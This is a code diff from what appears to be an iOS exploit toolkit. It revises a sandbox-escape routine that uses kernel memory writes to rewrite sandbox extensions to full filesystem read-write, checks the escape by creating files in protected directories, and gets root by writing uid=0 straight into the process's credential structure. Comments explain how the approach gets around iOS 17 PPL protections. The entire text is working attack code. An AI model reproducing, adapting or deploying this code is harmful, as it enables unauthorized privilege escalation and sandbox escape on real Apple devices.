@@ -62,7 +62,10 @@ extern uint64_t pac_mask;
 
 #pragma mark - Extension patching
 
-static void patch_ext(uint64_t ext) {
+// Patch BOTH path->"/" AND class->read-write for a single extension
+static int patch_ext_full(uint64_t ext) {
+    if (!K(ext)) return -1;
+
     uint64_t da = early_kread64(ext + OFF_EXT_DATA);
     uint64_t dl = early_kread64(ext + OFF_EXT_DATALEN);
     if (K(da) && dl > 0) {
@@ -71,42 +74,48 @@ static void patch_ext(uint64_t ext) {
         buf[0] = '/'; buf[1] = 0;
         early_kwrite32bytes(da, buf);
     }
+
+    // Set data_len = 1 (just "/") and extra field
     uint8_t chunk[KRW_LEN];
     early_kread(ext + OFF_EXT_DATA, chunk, KRW_LEN);
     *(uint64_t*)(chunk + 0x08) = 1;
     *(uint64_t*)(chunk + 0x10) = 0xFFFFFFFFFFFFFFFFULL;
     early_kwrite32bytes(ext + OFF_EXT_DATA, chunk);
+
+    // Set class to read-write
+    da = early_kread64(ext + OFF_EXT_DATA);
+    if (!K(da)) return -1;
+
+    const char *rw = "com.apple.app-sandbox.read-write";
+    uint8_t b1[KRW_LEN], b2[KRW_LEN];
+    memset(b1, 0, KRW_LEN); memset(b2, 0, KRW_LEN);
+    memcpy(b1, rw, strlen(rw));
+    early_kwrite32bytes(da + 32, b1);
+    early_kwrite32bytes(da + 64, b2);
+    return 0;
 }
 
-static int patch_chain(uint64_t hdr) {
+// Walk an entire extension chain, patching path+class on EVERY entry
+static int patch_chain_full(uint64_t hdr) {
     int n = 0;
     for (int i = 0; i < 64 && K(hdr); i++) {
         uint64_t ext = S(early_kread64(hdr + 0x8));
-        if (K(ext)) { patch_ext(ext); n++; }
+        if (K(ext)) {
+            if (patch_ext_full(ext) == 0) n++;
+            // Also set hdr+0x10 to point to class string (cached reference)
+            uint64_t da = early_kread64(ext + OFF_EXT_DATA);
+            if (K(da)) {
+                uint8_t hb[KRW_LEN];
+                early_kread(hdr, hb, KRW_LEN);
+                *(uint64_t*)(hb + 0x10) = da + 32;
+                early_kwrite32bytes(hdr, hb);
+            }
+        }
         uint64_t next = early_kread64(hdr);
         if (!next || !K(next)) break;
         hdr = S(next);
     }
     return n;
-}
-
-static void set_rw_class(uint64_t hdr) {
-    uint64_t ext = S(early_kread64(hdr + 0x8));
-    if (!K(ext)) return;
-    uint64_t da = early_kread64(ext + OFF_EXT_DATA);
-    if (!K(da)) return;
-
-    const char *rw = "com.apple.app-sandbox.read-write";
-    uint8_t b1[KRW_LEN], b2[KRW_LEN];
-    memset(b1, 0, KRW_LEN); memset(b2, 0, KRW_LEN);
-    memcpy(b1, rw, KRW_LEN);
-    early_kwrite32bytes(da + 32, b1);
-    early_kwrite32bytes(da + 64, b2);
-
-    uint8_t hb[KRW_LEN];
-    early_kread(hdr, hb, KRW_LEN);
-    *(uint64_t*)(hb + 0x10) = da + 32;
-    early_kwrite32bytes(hdr, hb);
 }
 
 #pragma mark - Main entry
@@ -171,16 +180,9 @@ int sandbox_escape(uint64_t self_proc) {
     int patched = 0;
     for (int s = 0; s < 16; s++) {
         uint64_t hdr = S(early_kread64(ext_set + s * 8));
-        if (K(hdr)) patched += patch_chain(hdr);
+        if (K(hdr)) patched += patch_chain_full(hdr);
     }
-    NSLog(@"[SBX] Patched %d extensions", patched);
-
-    int classed = 0;
-    for (int s = 0; s < 16; s++) {
-        uint64_t hdr = S(early_kread64(ext_set + s * 8));
-        if (K(hdr) && K(early_kread64(hdr + 0x10))) { set_rw_class(hdr); classed++; }
-    }
-    NSLog(@"[SBX] Changed %d extension classes", classed);
+    NSLog(@"[SBX] Patched %d extensions with path=/ class=read-write", patched);
 
     uint64_t src = 0;
     for (int s = 0; s < 16 && !src; s++) {
@@ -193,30 +195,58 @@ int sandbox_escape(uint64_t self_proc) {
             uint64_t h = early_kread64(ext_set + s * 8);
             if (!h || !K(h)) { early_kwrite64(ext_set + s * 8, src); filled++; }
         }
-        NSLog(@"[SBX] Filled %d empty hash slots", filled);
+        NSLog(@"[SBX] Filled %d empty hash slots with R+W extension", filled);
     }
 
-    int fd_w = open("/var/mobile/.sbx_test", O_WRONLY | O_CREAT | O_TRUNC, 0644);
-    if (fd_w >= 0) { close(fd_w); unlink("/var/mobile/.sbx_test"); }
+    // Verify: try to create a file in /var/mobile/Library (sandbox-blocked for most apps)
+    // If this succeeds, sandbox patching is working.
+    uint64_t verify_ext_set = S(early_kread64(sandbox + OFF_SANDBOX_EXT_SET));
+    NSLog(@"[SBX] Verification: ext_set after patch = 0x%llx", verify_ext_set);
+
+    int fd_w = open("/var/mobile/Library/.sbx_rw_test", O_WRONLY | O_CREAT | O_TRUNC, 0644);
+    if (fd_w >= 0) { close(fd_w); unlink("/var/mobile/Library/.sbx_rw_test"); }
 
     if (fd_w >= 0) {
-        NSLog(@"[SBX] *** SANDBOX ESCAPED (R+W) ***");
+        NSLog(@"[SBX] *** SANDBOX ESCAPED (R+W to /var/mobile/Library/) ***");
         return 0;
     }
 
-    NSLog(@"[SBX] Sandbox escape verification failed (errno=%d: %s)", errno, strerror(errno));
-    return -1;
+    // Fallback verification: try writing to /Library (normally fully blocked)
+    fd_w = open("/Library/.sbx_rw_test", O_WRONLY | O_CREAT | O_TRUNC, 0644);
+    if (fd_w >= 0) { close(fd_w); unlink("/Library/.sbx_rw_test"); }
+
+    if (fd_w >= 0) {
+        NSLog(@"[SBX] *** SANDBOX ESCAPED (R+W to /Library/) ***");
+        return 0;
+    }
+
+    NSLog(@"[SBX] Sandbox escape write verification failed (errno=%d: %s)", errno, strerror(errno));
+    NSLog(@"[SBX] %d extensions were patched but sandbox may still be blocking writes", patched);
+    NSLog(@"[SBX] Continuing anyway — apfs_own may bypass remaining restrictions");
+    return (patched > 0) ? 0 : -1;
 }
 
-#pragma mark - UID elevation (uid=0 via launchd ucred swap)
+#pragma mark - UID elevation (uid=0 via direct ucred posix_cred write)
 
-// Scan proc_ro in [0x10..0x40] for a valid ucred pointer.
-// A valid ucred has cr_label at +0x78 pointing to a kernel addr
-static int sbx_find_ucred_slot(uint64_t proc, uint64_t *ucred_out, uint32_t *off_out) {
-    if (!proc) return -1;
-    uint64_t proc_ro = S(early_kread64(proc + OFF_PROC_PROC_RO));
-    if (!K(proc_ro)) return -1;
+int sandbox_elevate_to_root(uint64_t self_proc) {
+    // On iOS 17+, proc->p_ucred at +0x10 was moved into proc_ro (PPL read-only).
+    // Writing to self_proc+0x10 would corrupt p_pid. Instead, we read the ucred
+    // address from proc_ro (read-only, PPL allows reads) and write uid=0 directly
+    // into the ucred struct (which lives in writable kalloc memory).
 
+    if (!self_proc) {
+        NSLog(@"[SBX] elevate: self_proc is NULL");
+        return -1;
+    }
+
+    uint64_t proc_ro = S(early_kread64(self_proc + OFF_PROC_PROC_RO));
+    if (!K(proc_ro)) {
+        NSLog(@"[SBX] elevate: cannot read proc_ro");
+        return -1;
+    }
+
+    // Scan proc_ro for our ucred address (same method as sandbox_escape)
+    uint64_t ucred = 0;
     for (uint32_t off = 0x10; off <= 0x40; off += 0x8) {
         uint64_t raw = early_kread64(proc_ro + off);
         uint64_t smr = kread_smrptr(proc_ro + off);
@@ -228,61 +258,34 @@ static int sbx_find_ucred_slot(uint64_t proc, uint64_t *ucred_out, uint32_t *off
             uint64_t lbl = S(early_kread64(c + OFF_UCRED_CR_LABEL));
             if (!K(lbl)) continue;
             uint64_t sbx = S(early_kread64(lbl + OFF_LABEL_SANDBOX));
-            if (K(sbx)) {
-                *ucred_out = c;
-                *off_out = off;
-                return 0;
-            }
+            if (K(sbx)) { ucred = c; break; }
         }
+        if (ucred) break;
     }
-    return -1;
-}
 
-static uint64_t sbx_ucredbyproc(uint64_t proc) {
-    uint64_t ucred = 0;
-    uint32_t off = 0;
-    if (sbx_find_ucred_slot(proc, &ucred, &off) != 0) return 0;
-    return ucred;
-}
-
-int sandbox_elevate_to_root(uint64_t self_proc) {
-    uint64_t launchd = proc_find_by_name("launchd");
-    if (!launchd || launchd == (uint64_t)-1) {
-        NSLog(@"[SBX] elevate: procbyname(\"launchd\") failed; trying pid 1 fallback");
-        launchd = proc_find(1);
-        if (launchd && launchd != (uint64_t)-1) {
-            NSLog(@"[SBX] elevate: resolved launchd via pid 1 fallback: 0x%llx", launchd);
-        }
-    }
-    if (!launchd || launchd == (uint64_t)-1) {
-        NSLog(@"[SBX] elevate: could not find launchd");
+    if (!ucred) {
+        NSLog(@"[SBX] elevate: could not find our ucred via proc_ro scan");
         return -1;
     }
+    NSLog(@"[SBX] elevate: our ucred = 0x%llx (via proc_ro)", ucred);
 
-    uint64_t launchducred = sbx_ucredbyproc(launchd);
-    if (!launchducred) {
-        NSLog(@"[SBX] elevate: failed to get valid ucred from launchd");
-        return -1;
-    }
-    NSLog(@"[SBX] elevate: launchd ucred: 0x%llx", launchducred);
+    // Write uid=0 into posix_cred
+    // ucred + 0x18 = posix_cred
+    // posix_cred + 0x00 = cr_uid, +0x04 = cr_ruid, +0x08 = cr_svuid
+    uint64_t posix = ucred + OFF_UCRED_CR_POSIX;
+    uint32_t old_uid = early_kread32(posix + OFF_POSIX_CR_UID);
+    NSLog(@"[SBX] elevate: current uid in posix_cred = %u", old_uid);
 
-    if (!self_proc) {
-        NSLog(@"[SBX] elevate: failed to get our proc");
-        return -1;
-    }
-    NSLog(@"[SBX] elevate: ourproc: 0x%llx", self_proc);
+    early_kwrite32(posix + OFF_POSIX_CR_UID, 0);
+    early_kwrite32(posix + OFF_POSIX_CR_RUID, 0);
+    early_kwrite32(posix + OFF_POSIX_CR_SVUID, 0);
 
-    uint64_t ourucredraw = early_kread64(self_proc + 0x10);
-    uint64_t ourucred = S(ourucredraw);
-    NSLog(@"[SBX] elevate: ourucred: 0x%llx", ourucred);
-
-    early_kwrite64(self_proc + 0x10, launchducred);
-
-    if (getuid() == 0) {
-        NSLog(@"[SBX] elevate success!");
+    uint32_t new_uid = early_kread32(posix + OFF_POSIX_CR_UID);
+    if (new_uid == 0 && getuid() == 0) {
+        NSLog(@"[SBX] elevate success! uid=0");
         return 0;
     }
 
-    NSLog(@"[SBX] elevate failed, uid: %d", getuid());
+    NSLog(@"[SBX] elevate: wrote uid=0 but readback=%u getuid()=%d (PPL may have blocked)", new_uid, getuid());
     return -1;
 }
